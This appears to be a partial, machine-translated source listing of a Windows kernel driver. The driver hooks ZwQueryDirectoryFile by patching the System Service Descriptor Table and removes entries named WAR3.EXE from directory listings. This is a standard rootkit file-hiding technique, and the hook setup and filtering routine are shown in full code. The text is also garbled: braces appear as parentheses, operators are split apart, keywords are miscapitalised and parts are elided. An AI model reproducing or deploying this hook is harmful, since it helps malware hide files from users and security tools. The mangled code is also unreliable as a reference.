# include <ntddk.h> 

# define FILE_DEVICE_NTHIDEFILES 0x8000 
# define NTHIDEFILES_IOCTL_BASE 0x800 

# define CTL_CODE_NTHIDEFILES (i) CTL_CODE (FILE_DEVICE_NTHIDEFILES, NTHIDEFILES_IOCTL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS) 
# define IOCTL_NTHIDEFILES_HELLO CTL_CODE_NTHIDEFILES (0) 

# define NTHIDEFILES_DEVICE_NAME L "\ \ Device \ \ NtHideFiles" 
# define NTHIDEFILES_DOS_DEVICE_NAME L "\ \ DosDevices \ \ NtHideFiles" 
... 
typedef struct _FILE_BOTH_DIR_INFORMATION 
( 
ULONG NextEntryOffset; 
ULONG FileIndex; 
LARGE_INTEGER CreationTime; 
LARGE_INTEGER LastAccessTime; 
LARGE_INTEGER LastWriteTime; 
LARGE_INTEGER ChangeTime; 
LARGE_INTEGER EndOfFile; 
LARGE_INTEGER AllocationSize; 
ULONG FileAttributes; 
ULONG FileNameLength; 
ULONG EaSize; 
CCHAR ShortNameLength; 
WCHAR ShortName [12]; 
WCHAR FileName [1]; 
) FILE_BOTH_DIR_INFORMATION, * PFILE_BOTH_DIR_INFORMATION; 

# pragma pack (1) 
typedef struct _SERVICE_DESCRIPTOR_ENTRY 
( 
unsigned int * ServiceTableBase; 
unsigned int * ServiceCounterTableBase; 
unsigned int NumberOfServices; 
unsigned char * ParamTableBase; 
) SERVICE_DESCRIPTOR_ENTRY, * PSERVICE_DESCRIPTOR_ENTRY; 
# pragma pack () 

/ / ZwQueryDirectoryFile prototype 
typedef NTSTATUS (NTAPI * PFN_ZwQueryDirectoryFile) ( 
IN HANDLE hFile, 
IN HANDLE hEvent OPTIONAL, 
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL, 
IN PVOID IoApcContext OPTIONAL, 
OUT PIO_STATUS_BLOCK pIoStatusBlock, 
OUT PVOID FileInformationBuffer, 
IN ULONG FileInformationBufferLength, 
IN FILE_INFORMATION_CLASS FileInfoClass, 
IN BOOLEAN bReturnOnlyOneEntry, 
IN PUNICODE_STRING PathMask OPTIONAL, 
IN BOOLEAN bRestartQuery); 

NTSYSAPI 
NTSTATUS 
NTAPI 
ZwQueryDirectoryFile ( 
IN HANDLE hFile, 
IN HANDLE hEvent OPTIONAL, 
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL, 
IN PVOID IoApcContext OPTIONAL, 
OUT PIO_STATUS_BLOCK pIoStatusBlock, 
OUT PVOID FileInformationBuffer, 
IN ULONG FileInformationBufferLength, 
IN FILE_INFORMATION_CLASS FileInfoClass, 
IN BOOLEAN bReturnOnlyOneEntry, 
IN PUNICODE_STRING PathMask OPTIONAL, 
IN BOOLEAN bRestartQuery); 

NTSTATUS HookZwQueryDirectoryFile ( 
IN HANDLE hFile, 
IN HANDLE hEvent OPTIONAL, 
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL, 
IN PVOID IoApcContext OPTIONAL, 
OUT PIO_STATUS_BLOCK pIoStatusBlock, 
OUT PVOID FileInformationBuffer, 
IN ULONG FileInformationBufferLength, 
IN FILE_INFORMATION_CLASS FileInfoClass, 
IN BOOLEAN bReturnOnlyOneEntry, 
IN PUNICODE_STRING PathMask OPTIONAL, 
IN BOOLEAN bRestartQuery); 

__declspec (dllimport) SERVICE_DESCRIPTOR_ENTRY KeServiceDescriptorTable; 

/ / Save the original function pointer ZwQueryDirectoryFile 
PFN_ZwQueryDirectoryFile OriginalZwQueryDirectoryFile = NULL; 

PMDL g_pmdlSystemCall = NULL; 
PVOID * MappedSystemCallTable = NULL; 
BOOLEAN g_bHooked = FALSE; 

# define SYSCALL_INDEX (_Function) * (PULONG) ((PUCHAR) _Function + 1) 
# define SYSTEMSERVICE (_Function) KeServiceDescriptorTable.ServiceTableBase [SYSCALL_INDEX (_Function)] 
# define HOOK_SYSCALL (_Function, _Hook, _Orig) _Orig = (PVOID) InterlockedExchange ((PLONG) & MappedSystemCallTable [SYSCALL_INDEX (_Function)], (LONG) _Hook) 
# define UNHOOK_SYSCALL (_Function, _Orig) InterlockedExchange ((PLONG) & MappedSystemCallTable [SYSCALL_INDEX (_Function)], (LONG) _Orig) 
... 
NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) 
( 
... 
/ / Map the memory into our domain to change the permissions on the MDL 
g_pmdlSystemCall = IoAllocateMdl (KeServiceDescriptorTable.ServiceTableBase, 
KeServiceDescriptorTable.NumberOfServices * 4, 
FALSE, FALSE, NULL); 

MmBuildMdlForNonPagedPool (g_pmdlSystemCall); 
/ / Change the flags of the MDL 
g_pmdlSystemCall-> MdlFlags = g_pmdlSystemCall-> MdlFlags | MDL_MAPPED_TO_SYSTEM_VA; 
MappedSystemCallTable = MmMapLockedPages (g_pmdlSystemCall, KernelMode); 

/ / HOOK ZwQueryDirectoryFile and save the original function address ZwQueryDirectoryFile 
HOOK_SYSCALL (ZwQueryDirectoryFile, HookZwQueryDirectoryFile, OriginalZwQueryDirectoryFile); 
.... 
) 


NTSTATUS HookZwQueryDirectoryFile ( 
IN HANDLE hFile, 
IN HANDLE hEvent OPTIONAL, 
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL, 
IN PVOID IoApcContext OPTIONAL, 
OUT PIO_STATUS_BLOCK pIoStatusBlock, 
OUT PVOID FileInformationBuffer, 
IN ULONG FileInformationBufferLength, 
IN FILE_INFORMATION_CLASS FileInfoClass, 
IN BOOLEAN bReturnOnlyOneEntry, 
IN PUNICODE_STRING PathMask OPTIONAL, 
IN BOOLEAN bRestartQuery) 
( 
NTSTATUS rc = STATUS_SUCCESS; 
ANSI_STRING ansiFileName, ansiDirName, HideDirFile; 
UNICODE_STRING uniFileName; 
PCWSTR pProcPath = NULL; 

/ / Initialization files need to worry too much about the name of the form of capital 
RtlInitAnsiString (& HideDirFile, "WAR3.EXE"); 

pProcPath = GetProcessFullName (); 
DbgPrint ( "[NtHideFiles] GetProcessFullName:% ws \ n", pProcPath == NULL? L "<null>": pProcPath); 

/ / Implementation of a real function ZwQueryDirectoryFile 
rc = OriginalZwQueryDirectoryFile ( 
hFile, 
hEvent, 
IoApcRoutine, 
IoApcContext, 
pIoStatusBlock, 
FileInformationBuffer, 
FileInformationBufferLength, 
FileInfoClass, 
bReturnOnlyOneEntry, 
PathMask, 
bRestartQuery); 

/ / If successful, the value of FILE_INFORMATION_CLASS and FileBothDirectoryInformation, we deal with filtering 
if (NT_SUCCESS (rc) & & FileInfoClass == FileBothDirectoryInformation) 
( 
/ / Assign the results of the implementation of pFileInfo 
PFILE_BOTH_DIR_INFORMATION pFileInfo = (PFILE_BOTH_DIR_INFORMATION) FileInformationBuffer; 
PFILE_BOTH_DIR_INFORMATION pLastFileInfo = NULL; 
BOOLEAN bLastOne = FALSE; 

/ / Circulation checks 
do 
( 
bLastOne =! pFileInfo-> NextEntryOffset; 
RtlInitUnicodeString (& uniFileName, pFileInfo-> FileName); 
RtlUnicodeStringToAnsiString (& ansiFileName, & uniFileName, TRUE); 
RtlUnicodeStringToAnsiString (& ansiDirName, & uniFileName, TRUE); 
RtlUpperString (& ansiFileName, & ansiDirName); 

/ / Print results, print the results to see debugview 
/ / dprintf ( "ansiFileName:% s \n", ansiFileName.Buffer); 
/ / dprintf ( "HideDirFile:% s \n", HideDirFile.Buffer); 

/ / Start of comparison, if found the document on the hidden directory or 
if (RtlCompareMemory (ansiFileName.Buffer, HideDirFile.Buffer, HideDirFile.Length) == HideDirFile.Length) 
( 
dprintf ( "This is HideDirFile! \n"); 

if (bLastOne) 
( 
if (pFileInfo == (PFILE_BOTH_DIR_INFORMATION) FileInformationBuffer) 
rc = STATUS_NO_MORE_FILES; / / hidden files or directories; 
else 
pLastFileInfo-> NextEntryOffset = 0; 

break; 
) 
else / / pointer future mobile 
( 
int iPos = (ULONG) pFileInfo - (ULONG) FileInformationBuffer; 
int iLeft = (ULONG) FileInformationBufferLength - iPos - pFileInfo-> NextEntryOffset; 
RtlCopyMemory ((PVOID) pFileInfo, (PVOID) ((PCHAR) pFileInfo + pFileInfo-> NextEntryOffset), (ULONG) iLeft); 
continue; 
) 
) 

pLastFileInfo = pFileInfo; 
pFileInfo = (PFILE_BOTH_DIR_INFORMATION) ((PCHAR) pFileInfo + pFileInfo-> NextEntryOffset); 
) While (! BLastOne); 

RtlFreeAnsiString (& ansiDirName); 
RtlFreeAnsiString (& ansiFileName); 
) 

return rc; 
)